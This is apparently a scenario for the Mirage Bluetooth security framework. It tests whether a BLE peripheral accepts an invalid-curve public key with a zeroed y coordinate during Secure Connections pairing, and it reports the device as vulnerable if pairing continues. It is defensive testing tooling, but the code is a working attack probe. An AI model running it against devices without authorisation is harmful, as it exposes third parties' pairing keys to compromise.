from mirage.core import scenario
from mirage.libs import io, ble, utils
from mirage.libs.ble_utils.dissectors import *
from mirage.libs.ble_utils.sc_crypto import CryptoUtils
from binascii import unhexlify


class ble_fixed_coord_invalid_curve(scenario.Scenario):
    def onStart(self):
        self.module.printScenarioStart("Fixed coordinate invalid curve")
        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT

        # Apply new address at each start
        self.module.emitter.setAddress(CryptoUtils.getRandomAddress(), random=True)
        # Connect on slave
        io.info("Connect on slave")
        address = utils.addressArg(self.module.args["TARGET"])
        connectionType = self.module.args["CONNECTION_TYPE"]
        self.module.emitter.sendp(
            ble.BLEConnect(dstAddr=address, type=connectionType, initiatorType="random")
        )
        while not self.module.emitter.isConnected():
            utils.wait(seconds=0.5)
        return True

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(self.module.BLEStage.STOP)
        return True

    def slaveConnectionComplete(self, packet):
        self.module.setStage(self.module.BLEStage.IDLE)
        io.info("Slave connected")
        self.connected = True

    def onSlaveDisconnect(self, packet):
        self.module.setStage(self.module.BLEStage.STOP)
        return False

    def onSlavePairingResponse(self, packet):
        io.info("Received Pairing Response: {}".format(packet))
        self.module.localAddress = self.module.emitter.getAddress()
        self.module.localAddressType = (
            0 if self.module.emitter.getAddressMode() == "public" else 1
        )

        self.module.remoteAddress = self.module.emitter.getCurrentConnection()
        self.module.remoteAddressType = (
            0 if self.module.emitter.getCurrentConnectionMode() == "public" else 1
        )

        io.info("{}".format(packet))
        self.module.pairingResponse = packet
        self.module.pRes = self.module.pairingResponse.payload[::-1]

        self.module.responderAuthReq = ble.AuthReqFlag(
            data=bytes([packet.authentication])
        )
        self.module.responderInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )
        self.module.responderKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.responderKeyDistribution])
        )

        (nwOrderPubKeyX, nwOrderPubKeyY) = self.module.sc_crypto.generateDHKeyPair()
        self.module.remoteIOCap = (
            format(packet.authentication, "02x")
            + ("01" if packet.outOfBand else "00")
            + format(packet.inputOutputCapability, "02x")
        )
        self.module.remoteIOCap = unhexlify(self.module.remoteIOCap)
        response = ble.BLEPublicKey(key_x=nwOrderPubKeyX, key_y=b"\x00" * 16)
        io.info("{}".format(response))
        self.module.emitter.sendp(response)
        io.success("Sended Public Key with y coordinate equals zero...")
        return False

    def onSlavePairingFailed(self, packet):
        self.success = self.module.ScenarioResult.NOT
        self.finished = True
        self.module.finished = True
        io.success("Slave rejected pairing...")
        return False

    def onSlavePublicKey(self, packet):
        self.success = self.module.ScenarioResult.VULN
        self.finished = True
        self.module.emitter.sendp(
            ble.BLEPairingFailed(reason=ble.SM_ERR_PAIRING_NOT_SUPPORTED)
        )
        self.module.finished = True
        io.fail("Slave continued with pairing...")
        return False
